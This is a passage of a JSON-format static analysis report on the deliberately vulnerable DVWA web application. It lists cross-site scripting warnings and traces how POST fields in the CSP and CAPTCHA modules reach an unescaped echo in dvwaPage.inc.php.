              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:15 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4600",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "95F5B989B86265FDF8BF8D2DCF60A979"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - impossible.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:39 - impossible.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:55 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 55
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:11 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:14 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4606",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "97D3BA22BF5E97B309DFFFD0E58C9E63"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Read $_POST['password_conf']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:9 - Assignment to $pass_conf"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4607",
      "message" : {
